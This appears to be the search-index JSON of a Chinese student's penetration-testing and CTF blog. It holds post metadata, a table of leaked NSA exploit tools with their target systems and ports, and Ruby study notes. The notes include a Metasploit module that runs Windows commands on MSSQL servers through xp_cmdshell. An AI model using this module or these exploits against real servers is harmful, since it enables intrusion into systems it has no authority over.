{"meta":{"title":"JD1412","subtitle":"黑色的眼睛","description":"桃李不言，下自成蹊","author":"Healer","url":"https://github.com/JD1412/JD1412.github.io.git"},"pages":[{"title":"","date":"2019-01-13T12:35:53.600Z","updated":"2019-01-13T12:35:53.600Z","comments":true,"path":"404.html","permalink":"https://github.com/JD1412/JD1412.github.io.git/404.html","excerpt":"","text":"404 - arao'blog L2Dwidget.init({\"model\":{\"jsonPath\":\"/live2dw/assets/z16.model.json\"},\"display\":{\"position\":\"right\",\"width\":150,\"height\":300},\"mobile\":{\"show\":true},\"log\":false,\"pluginJsPath\":\"lib/\",\"pluginModelPath\":\"assets/\",\"pluginRootPath\":\"live2dw/\",\"tagMode\":false});"},{"title":"404","date":"2019-01-13T12:53:44.000Z","updated":"2019-01-14T01:49:28.137Z","comments":true,"path":"404/index.html","permalink":"https://github.com/JD1412/JD1412.github.io.git/404/index.html","excerpt":"","text":""},{"title":"About","date":"2019-01-13T23:39:50.793Z","updated":"2019-01-13T23:39:50.757Z","comments":true,"path":"about/index.html","permalink":"https://github.com/JD1412/JD1412.github.io.git/about/index.html","excerpt":"","text":"GitHub上的博客简洁到让人心动，总算是找出来的一点时间,在这里部署一下属于自己的博客这个博客只是分享一些我的学习笔记，目前小白阶段，但是这一路走着多少还是有点收获能把自己学习到的东西分享出来是一种快乐，同时也是帮助自己能够讲清楚自己在学的东西，都知道“看懂”和“讲明白”是两个概念这可能也算是一个监督的方法吧，开了这么个博客一直不更新也不好，还是希望我能够不断地有东西分享上来，至少证明我是一直在保持前进的"},{"title":"Categories","date":"2019-01-13T20:45:46.778Z","updated":"2019-01-13T20:45:46.742Z","comments":true,"path":"categories/index.html","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/index.html","excerpt":"","text":""},{"title":"Schedule","date":"2019-01-13T19:38:23.000Z","updated":"2019-01-13T19:40:36.142Z","comments":true,"path":"schedule/index.html","permalink":"https://github.com/JD1412/JD1412.github.io.git/schedule/index.html","excerpt":"","text":""},{"title":"Tags","date":"2019-01-13T20:51:58.000Z","updated":"2019-01-13T20:53:29.082Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/index.html","excerpt":"","text":""},{"title":"commonweal","date":"2019-01-13T12:33:35.000Z","updated":"2019-01-13T12:37:02.080Z","comments":true,"path":"commonweal/index.html","permalink":"https://github.com/JD1412/JD1412.github.io.git/commonweal/index.html","excerpt":"","text":""}],"posts":[{"title":"WIFI密码破解","slug":"WIFI密码破解","date":"2019-01-15T07:21:20.000Z","updated":"2019-01-15T07:22:18.570Z","comments":true,"path":"2019/01/15/WIFI密码破解/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/WIFI密码破解/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"WIFI","slug":"WIFI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/WIFI/"},{"name":"WIFI密码破解","slug":"WIFI密码破解","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/WIFI密码破解/"}]},{"title":"WIFI断网攻击","slug":"WIFI断网攻击","date":"2019-01-15T07:18:37.000Z","updated":"2019-01-15T07:20:17.018Z","comments":true,"path":"2019/01/15/WIFI断网攻击/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/WIFI断网攻击/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"WIFI","slug":"WIFI","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/WIFI/"},{"name":"WIFI拒绝服务","slug":"WIFI拒绝服务","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/WIFI拒绝服务/"}]},{"title":"MITM（中间人）攻击","slug":"MITM（中间人）攻击","date":"2019-01-15T06:59:29.000Z","updated":"2019-01-15T07:02:36.670Z","comments":true,"path":"2019/01/15/MITM（中间人）攻击/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/MITM（中间人）攻击/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"arpspoof","slug":"arpspoof","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/arpspoof/"},{"name":"Ettercap","slug":"Ettercap","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Ettercap/"},{"name":"driftnet","slug":"driftnet","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/driftnet/"},{"name":"MITM","slug":"MITM","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/MITM/"},{"name":"DNS欺骗","slug":"DNS欺骗","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/DNS欺骗/"}]},{"title":"NSA Tools Windows清单","slug":"NSA-Tools-Windows清单","date":"2019-01-15T06:51:57.000Z","updated":"2019-01-15T06:53:04.622Z","comments":true,"path":"2019/01/15/NSA-Tools-Windows清单/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/NSA-Tools-Windows清单/","excerpt":"","text":"NSA武器库工具分析 名称 支持系统或应用软件 攻击服务或环境 端口 Easybee 应用软件MDaemon邮件服务器（9.5.2-10.1.2） MDaemon 无 Englishmansdentist MS Exchange 2000/2003/2007 (Outlook Exchange Webaccess) SMTP 25 Eskimoroll W2K,W2K3(R2),W2K8(R2) Kerberos(域控环境)漏洞(MS14-068) 88 Zippybeer WindowsDomain Windows域控，SMB服务漏洞 445 Eternalsynergy WIN8_X64_SP0，SERVER_2012_X64_SP0 SMBv3(MS17-010) 445 Explodingcan W2K3（IIS6.0） WEBDAV 无 Easypi Windows NT, 2000 ,XP, 2003 IBM Lotus Notes 无 Emphasismine 需要目标主机安装IBM Lotus Domino版本（6.5.4, 6.5.5, 7.0, 8.0, 8.5） IBM Lotus Domino 无 Etre Mail 8.10~8.22 IMail 8.10~8.22远程利用工具 无 Educatedscholar Windows vista, 2008 SMB2协议漏洞(MS19-050) 445 Emeraldthread Windows XP,Vista,7,Windows Server2003,2008 SMBv1(MS10-016) 无 Earlyshovel Sendmai 8.11.x REDHAT 7.0/7.1/7.3 的sendmail RPC漏洞 无 Ebbshave Solaris 2.6,2.7,2.8,2.9,2.10 攻击Solaris系统的RPC服务 无 Ewokfrenzy IBM Lotus Domino 6.5.4, 7.0.2 IMAP漏洞 143 Esteemaudit WinXP, W2K3 RDP漏洞 3389 Eternalromance WinXP, Vista, Win7,W2K3, W2K8, W2K8R2 SMBv1漏洞(MS17-010)和 NBT漏洞 139/445 Eternalchampion WinXP, Vista, Win7, W2K3, W2K8, W2K8R2, W2K12, Win8SP0 SMB和NBT漏洞 139/445 Eternalblue WinXP-W2K12 SMBv2远程溢出漏洞(MS17-010) 139/445 Erraticgopher WinXPSP3, W2K3 RPC漏洞 445 Eclipsedwing W2K, WinXP, W2K3 MS08-067漏洞(MS08-067) 139/445","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Windows","slug":"Windows","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Windows/"}]},{"title":"Explodingcan复现","slug":"Explodingcan复现","date":"2019-01-15T06:48:00.000Z","updated":"2019-01-16T15:11:53.555Z","comments":true,"path":"2019/01/15/Explodingcan复现/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/Explodingcan复现/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Fuzzbunch","slug":"Fuzzbunch","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Fuzzbunch/"},{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"Explodingcan","slug":"Explodingcan","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Explodingcan/"}]},{"title":"EternalRomance复现","slug":"EternalRomance复现","date":"2019-01-15T06:45:00.000Z","updated":"2019-01-16T15:12:06.620Z","comments":true,"path":"2019/01/15/EternalRomance复现/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/EternalRomance复现/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Fuzzbunch","slug":"Fuzzbunch","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Fuzzbunch/"},{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"EternalRomance","slug":"EternalRomance","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/EternalRomance/"}]},{"title":"Eternalchampion漏洞利用","slug":"Eternalchampion漏洞利用","date":"2019-01-15T06:44:00.000Z","updated":"2019-01-16T15:12:16.992Z","comments":true,"path":"2019/01/15/Eternalchampion漏洞利用/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/Eternalchampion漏洞利用/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Fuzzbunch","slug":"Fuzzbunch","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Fuzzbunch/"},{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"Eternalchampion","slug":"Eternalchampion","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Eternalchampion/"}]},{"title":"Esteemaudit复现","slug":"Esteemaudit复现","date":"2019-01-15T06:41:00.000Z","updated":"2019-01-16T15:12:26.296Z","comments":true,"path":"2019/01/15/Esteemaudit复现/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/Esteemaudit复现/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Fuzzbunch","slug":"Fuzzbunch","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Fuzzbunch/"},{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"Esteemaudit","slug":"Esteemaudit","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Esteemaudit/"}]},{"title":"Erraticgopher复现","slug":"Erraticgopher复现","date":"2019-01-15T06:38:00.000Z","updated":"2019-01-16T15:12:55.244Z","comments":true,"path":"2019/01/15/Erraticgopher复现/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/Erraticgopher复现/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Fuzzbunch","slug":"Fuzzbunch","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Fuzzbunch/"},{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"Erraticgopher","slug":"Erraticgopher","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Erraticgopher/"}]},{"title":"Eclipsedwing漏洞复现","slug":"Eclipsedwing漏洞复现","date":"2019-01-15T06:35:00.000Z","updated":"2019-01-16T15:13:19.465Z","comments":true,"path":"2019/01/15/Eclipsedwing漏洞复现/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/Eclipsedwing漏洞复现/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"Eclipsedwing","slug":"Eclipsedwing","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Eclipsedwing/"},{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Fuzzbunch","slug":"Fuzzbunch","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Fuzzbunch/"},{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"}]},{"title":"EternalBlue漏洞利用","slug":"EternalBlue漏洞利用","date":"2019-01-15T06:29:00.000Z","updated":"2019-01-16T15:13:07.932Z","comments":true,"path":"2019/01/15/EternalBlue漏洞利用/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/EternalBlue漏洞利用/","excerpt":"","text":"","categories":[{"name":"渗透测试","slug":"security","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/security/"}],"tags":[{"name":"NSA武器库","slug":"NSA武器库","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/NSA武器库/"},{"name":"Fuzzbunch","slug":"Fuzzbunch","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Fuzzbunch/"},{"name":"meterpreter","slug":"meterpreter","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/meterpreter/"},{"name":"Eternalblue","slug":"Eternalblue","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Eternalblue/"}]},{"title":"Ruby语言学习笔记","slug":"Ruby语言学习笔记","date":"2019-01-14T19:49:43.000Z","updated":"2019-01-14T20:02:16.289Z","comments":true,"path":"2019/01/15/Ruby语言学习笔记/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/15/Ruby语言学习笔记/","excerpt":"","text":"Ruby语言学习笔记 常量：[A-Z]开头 只能够被赋值一次 局部变量：[a-z] | _ 开头 类变量：@@ 实例变量：@ 全局变量：$ 特殊变量 逻辑运算 三目运算符a=((1==2) ? &quot;true&quot; : &quot;false&quot;) 分支结构 123if a&lt;0 then print \"i love you\"end 12345if a&lt;0 then puts \"i love you\"else puts \"i don't love you\"end 12345unless a&lt;0 then # unless语句是if语句的否定版 puts \"i love you\"else puts \"i don't love you\"end 1234567if a&lt;0 then puts \"i love you\"elsif a&gt;1 then puts \"i don't love you\"else puts \"you are so foolish\"end 多分支结构 123456789a = 1case awhen a&lt;0 puts \"i love you\"when a&gt;1 puts \"i don't love you\"elseputs \"this is a test\"end 循环语句 123while a&lt;1 puts \"i love you\"end 单行循环 12a = 1(puts i;i+=1) while i&lt;=3 until循环 123until a&lt;1 puts \"i love you\"end for循环 1234a = 1for a in 1..3 puts aend 循环控制 1234break #结束循环next # 同continueredo # 重做本次循环，不检查循环条件retry # 重做循环，从头开始 打印输出 12put \"i love you\" # 换行print \"i love you\" # 不换行 函数使用： 123def ruby puts(\"i love you\")end 块 12345&#123; puts \"i love you\"&#125;# ordo puts \"i love you\"end 123456789101112def test_block puts \"Start\" yield yield puts \"End\"endtest_block &#123;puts \"test_1\"&#125;test_block do puts \"test_2\" puts \"test_3\"end 带参数1234567def test_block puts \"Start\" yield(1,2) yeild(2,3) puts \"End\"endtest_block &#123;|a,b| puts a+b&#125; 迭代器 1234567891011123.times&#123; puts \"i love you\"&#125; #循环3次puts \"------------------\"1.upto(9)&#123;|i| print i if i&lt;6&#125; #从1到9的循环满足if条件的输出puts \"------------------\"1.upto(9) do |x| #同上 print x,\" \"end9.downto(1)&#123;|i| print i if i&lt;6&#125; #从9到1的循环满足if条件的输出puts \"------------------\"0.step(12,3)&#123;|i| print i&#125;(1..9).each&#123;|i| print i if i&lt;6&#125; #从1到9中取出满足条件的数[1,2,3,4,5,6].each&#123;|var| print var,\" \"&#125; #打印集合中的元素 编写简单的迭代器123456def repeat(num,s) while num&gt;0 yeild(s) endendrepeat(3,\"i love you\") &#123;|s| puts s&#125; 过程对象（可以作为参数传递） 12345678910def test(p) puts \"Start\" p.call puts \"End\"endt=proc&#123; puts \"i love you\"&#125;test(t)test(proc&#123;puts \"Do you live me?\"&#125;) 类的使用 12345678910111213141516171819202122232425262728class MetasploitModule &lt; Msf::Auxiliary #类‘MetasploitModule’继承‘Msf::Auxiliary’ include Msf::Exploit::Remote::MSSQL # include 引用核心库中的MSSQL def initialize(info = &#123;&#125;) super(update_info(info, 'Name' =&gt; 'Microsoft SQL Server xp_cmdshell Command Execution', 'Description' =&gt; %q&#123; This module will execute a Windows command on a MSSQL/MSDE instance via the xp_cmdshell procedure. A valid username and password is required to use this module &#125;, 'Author' =&gt; [ 'tebo &lt;tebo[at]attackresearch.com&gt;' ], 'License' =&gt; MSF_LICENSE, 'References' =&gt; [ [ 'URL', 'http://msdn.microsoft.com/en-us/library/cc448435(PROT.10).aspx'], ] )) register_options( [ OptString.new('CMD', [ false, 'Command to execute', 'cmd.exe /c echo OWNED &gt; C:\\\\owned.exe']), ]) end def run mssql_xpcmdshell(datastore['CMD'], true) if mssql_login_datastore endend 数据类型 正常的就不演示了，下面是几个特殊的用法 1234puts 123_23 # 结果:12323 整形中的下划线会被自动省去puts 023 #0-八进制puts 0x4f #0x-十六进制puts 0b101010101 #0b-表示二进制 这段没有试成功，还不知道是为什么 数值的常用方法 数学计算方法 12Math.cos() #类似这种的使用的时候是用的Math库# 目前还不需要这一块的内容，以后需要了再看吧 字符串 操作一大堆，翻书查资料去吧12345678#!/usr/bin/rubya = \"i loVe you\"p ap a.upcasep afoo = a.upcase!p foop a 正则表达式 日期和时间 散列表 区间的概念 12ra.Range.new(1,5,true) # 这里的true是控制是否包含最后一个值（这里是‘5’）ra.each &#123;|i| p i&#125; 数组 结构体 12345678910111213#!/usr/bin/rubyg = Struct.new(\"Girl\", :name, :age, :love)student = g.new(\"zhangsan\", 22, \"true\")p student.valuesp student[0]p student[-1]p student.lengthp student.sizep student.membersp student.valuesp student.to_ap student.values_at(0,1) 数据类型转换 to_ary to_hash to_int to_s to_str to_f to_i和to_i(base) 模块 （不能实例化，可以调用） 12345678910111213141516171819#!/usr/bin/rubymodule My NA = \"China\" def My.set_name(name) @name=name end def My.get_name return @name end def My.set_age @age=age endendMy.set_name(\"zhangsan\")p My.get_namep My::NA Mixin 在类中使用某个模块123class Test include MY # 这应用的是上一个例子中的moduleend 引用其他模块 1require 'msf/core' # 此功能类似于C语言中的include，这里可以直接是要引入的模块文件的文件名 线程 123456789#!/usr/bin/rubyThread.start&#123; while true puts 'Thread 1' end&#125;while true puts 'Thread 2'end 其他用法 线程同步，互斥，共享数据保护等 这一篇就到这后面的文件操作、数据库操作、桌面应用、web开发等详细内容，参见《Ruby入门权威指南》于天恩的书上的内容，这个笔记也是根据这个书的讲解顺序记录了一部分我目前需要掌握的部分","categories":[{"name":"编程","slug":"programming","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/programming/"}],"tags":[{"name":"Ruby","slug":"Ruby","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Ruby/"}]},{"title":"阶段总结","slug":"阶段总结-1","date":"2019-01-14T00:07:20.000Z","updated":"2019-01-14T00:09:08.037Z","comments":true,"path":"2019/01/14/阶段总结-1/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/阶段总结-1/","excerpt":"","text":"这一部分是将之前写到CSDN上的博客全都搬了过来，争取以后再写的时候两边可以同时上传","categories":[],"tags":[]},{"title":"GDB插件控制","slug":"GDB插件控制","date":"2019-01-14T00:05:23.000Z","updated":"2019-01-14T00:06:30.629Z","comments":true,"path":"2019/01/14/GDB插件控制/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/GDB插件控制/","excerpt":"","text":"这篇在CSDN上看吧！ https://blog.csdn.net/aptx4869_li/article/details/81566541","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"GDB","slug":"GDB","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/GDB/"},{"name":"peda","slug":"peda","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/peda/"},{"name":"gef","slug":"gef","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/gef/"},{"name":"pwndbg","slug":"pwndbg","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/pwndbg/"},{"name":"Linux","slug":"Linux","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Linux/"},{"name":"Shell脚本","slug":"Shell脚本","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Shell脚本/"}]},{"title":"中级ROP-ret2__libc_csu_init","slug":"中级ROP-ret2-libc-csu-init","date":"2019-01-14T00:02:55.000Z","updated":"2019-01-14T00:04:59.797Z","comments":true,"path":"2019/01/14/中级ROP-ret2-libc-csu-init/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/中级ROP-ret2-libc-csu-init/","excerpt":"","text":"这篇在CSDN上看吧！ https://blog.csdn.net/aptx4869_li/article/details/81322632","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWN/"},{"name":"IDA","slug":"IDA","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/IDA/"},{"name":"shell","slug":"shell","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/shell/"},{"name":"PWNTOOLS","slug":"PWNTOOLS","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWNTOOLS/"},{"name":"ROP","slug":"ROP","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/ROP/"},{"name":"缓冲区溢出","slug":"缓冲区溢出","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/缓冲区溢出/"},{"name":"ret2_libc_csu_init","slug":"ret2-libc-csu-init","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/ret2-libc-csu-init/"}]},{"title":"Windows 下 shellcode 编写","slug":"Windows-下-shellcode-编写","date":"2019-01-13T23:59:59.000Z","updated":"2019-01-14T00:02:07.225Z","comments":true,"path":"2019/01/14/Windows-下-shellcode-编写/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Windows-下-shellcode-编写/","excerpt":"","text":"这篇在CSDN上看吧 https://blog.csdn.net/aptx4869_li/article/details/80711639","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Windows/"},{"name":"shellcode","slug":"shellcode","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/shellcode/"},{"name":"Ollydbg","slug":"Ollydbg","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Ollydbg/"},{"name":"PWNTOOLS","slug":"PWNTOOLS","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWNTOOLS/"}]},{"title":"百度杯十一月第一周 PWN loading 详解","slug":"百度杯十一月第一周-PWN-loading-详解","date":"2019-01-13T23:57:49.000Z","updated":"2019-01-13T23:59:01.157Z","comments":true,"path":"2019/01/14/百度杯十一月第一周-PWN-loading-详解/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/百度杯十一月第一周-PWN-loading-详解/","excerpt":"","text":"这篇博客在CSDN上看吧！ https://blog.csdn.net/aptx4869_li/article/details/80634500","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWN/"},{"name":"Writeup","slug":"Writeup","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Writeup/"},{"name":"IDA","slug":"IDA","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/IDA/"},{"name":"shellcode","slug":"shellcode","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/shellcode/"}]},{"title":"2018年全国大学生信息安全竞赛 CISCN Writeup","slug":"2018年全国大学生信息安全竞赛-CISCN-Writeup","date":"2019-01-13T23:54:57.000Z","updated":"2019-01-13T23:57:03.277Z","comments":true,"path":"2019/01/14/2018年全国大学生信息安全竞赛-CISCN-Writeup/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/2018年全国大学生信息安全竞赛-CISCN-Writeup/","excerpt":"","text":"这篇看我的CSDN上的博客吧 https://blog.csdn.net/aptx4869_li/article/details/80589250","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Writeup/"},{"name":"IDA","slug":"IDA","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/IDA/"},{"name":"CTF","slug":"CTF","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/CTF/"},{"name":"CISCN","slug":"CISCN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/CISCN/"},{"name":"全国大学生信息安全竞赛","slug":"全国大学生信息安全竞赛","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/全国大学生信息安全竞赛/"},{"name":"MD5","slug":"MD5","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/MD5/"}]},{"title":"安恒杯-Misc","slug":"安恒杯-Misc","date":"2019-01-13T23:53:21.000Z","updated":"2019-01-13T23:54:26.541Z","comments":true,"path":"2019/01/14/安恒杯-Misc/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/安恒杯-Misc/","excerpt":"","text":"这个看我的CSDN上的博客吧 https://blog.csdn.net/aptx4869_li/article/details/79173366","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/CTF/"},{"name":"Misc","slug":"Misc","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Misc/"}]},{"title":"2017湖湘杯pwn200_wp_格式化字符串漏洞","slug":"2017湖湘杯pwn200-wp-格式化字符串漏洞","date":"2019-01-13T23:50:39.000Z","updated":"2019-01-13T23:52:37.385Z","comments":true,"path":"2019/01/14/2017湖湘杯pwn200-wp-格式化字符串漏洞/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/2017湖湘杯pwn200-wp-格式化字符串漏洞/","excerpt":"","text":"这篇博客看我的CSDN上的吧！ https://blog.csdn.net/aptx4869_li/article/details/78950337","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWN/"},{"name":"Writeup","slug":"Writeup","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Writeup/"},{"name":"CANARY","slug":"CANARY","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/CANARY/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/格式化字符串/"}]},{"title":"CANARY爆破","slug":"CANARY爆破","date":"2019-01-13T23:46:11.000Z","updated":"2019-01-13T23:47:50.517Z","comments":true,"path":"2019/01/14/CANARY爆破/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/CANARY爆破/","excerpt":"","text":"这个看我的CSDN上的博客吧 https://blog.csdn.net/aptx4869_li/article/details/78884099","categories":[{"name":"CTF","slug":"ctf","permalink":"https://github.com/JD1412/JD1412.github.io.git/categories/ctf/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/PWN/"},{"name":"CANARY","slug":"CANARY","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/CANARY/"},{"name":"Reverse","slug":"Reverse","permalink":"https://github.com/JD1412/JD1412.github.io.git/tags/Reverse/"}]},{"title":"2017年湖湘杯复赛 pwn100-writeup","slug":"2017年湖湘杯复赛-pwn100-writeup","date":"2019-01-13T23:41:08.000Z","updated":"2019-01-14T02:23:08.029Z","comments":true,"path":"2019/01/14/2017年湖湘杯复赛-pwn100-writeup/","link":"","permalink":"https://github.com/JD1412/JD1412.github.io.git/2019/01/14/2017年湖湘杯复赛-pwn100-writeup/","excerpt":"","text":"这个博客看我的CSDN上的博客吧 